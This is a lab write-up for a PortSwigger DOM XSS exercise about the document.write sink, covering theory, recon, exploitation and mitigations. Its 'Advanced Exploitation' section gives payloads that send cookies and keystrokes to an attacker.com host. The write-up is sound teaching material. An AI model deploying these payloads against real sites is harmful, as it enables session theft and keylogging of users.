# DOM XSS - document.write Sink

## Lab Link
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

## Difficulty
Apprentice

## Vulnerability Type
DOM-Based Cross-Site Scripting (XSS)

## Theory
DOM-based XSS occurs when JavaScript code running in the browser uses user input to manipulate DOM without proper encoding. Unlike reflected/stored XSS, the vulnerability exists in client-side JavaScript code.

`document.write()` is dangerous because it directly writes HTML to the document, interpreting it as markup. When user input is passed to `document.write()`, injected HTML/JavaScript executes immediately.

Example vulnerable code:
```javascript
var url = new URLSearchParams(window.location.search).get('search');
document.write('<h1>Search results for: ' + url + '</h1>');
```

Attacker payload: `<img src=x onerror="alert('XSS')">`

## Recon Process
1. Identify JavaScript that reads URL parameters (location.search, window.hash)
2. Trace where these values are used in DOM manipulation
3. Look for dangerous sinks: `document.write()`, `innerHTML`, `appendChild()`
4. Test with simple payload: `<img src=x onerror=alert('test')>`
5. Verify JavaScript execution in browser console

## Exploitation Steps

### Step 1: Analyze Page Source
- View page source (Ctrl+U)
- Identify JavaScript reading URL parameters
- Note which DOM sink is used (document.write, innerHTML, etc.)

### Step 2: Craft Payload
For `document.write()` vulnerability:
```
Payload: <img src=x onerror="alert('DOM XSS')">
Full URL: https://target.com/page?search=<img src=x onerror="alert('DOM XSS')">
```

### Step 3: Test Exploitation
- Modify URL with payload
- Page should trigger alert box
- Alert confirms DOM XSS vulnerability

### Step 4: Advanced Exploitation
```javascript
// Steal cookies
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">

// Keylogger
<img src=x onerror="document.onkeypress=e=>fetch('http://attacker.com/key?k='+e.key)">
```

## Root Cause
- JavaScript reads untrusted input from URL
- Input passed directly to DOM-writing function
- No encoding/filtering of dangerous characters
- Trust in browser's same-origin policy

## Impact
- **Session Hijacking:** Steal session cookies
- **Credential Theft:** Create fake login form
- **Malware Injection:** Inject malicious scripts
- **Phishing:** Modify page content

## Mitigations

### 1. **Use textContent Instead of innerHTML**
```javascript
// Vulnerable
document.getElementById('result').innerHTML = userInput;

// Safe
document.getElementById('result').textContent = userInput;
```

### 2. **Encode HTML Entities**
```javascript
function htmlEncode(str) {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
}
```

### 3. **Use DOM APIs Instead of Writing Strings**
```javascript
// Bad
document.write('<div>' + userInput + '</div>');

// Good
const div = document.createElement('div');
div.textContent = userInput;
document.body.appendChild(div);
```

### 4. **Content Security Policy**
```
Content-Security-Policy: script-src 'self'; object-src 'none';
```

### 5. **Input Validation**
- Whitelist allowed characters
- Reject suspicious patterns
- Validate URL format

## Key Differences from Reflected XSS
- No server-side processing needed
- Vulnerability exists in client-side code
- May not appear in network requests
- Harder to detect with WAF

## Prevention Strategy
Avoid DOM-writing functions entirely. Use safer alternatives like `textContent` or `createElement()`.
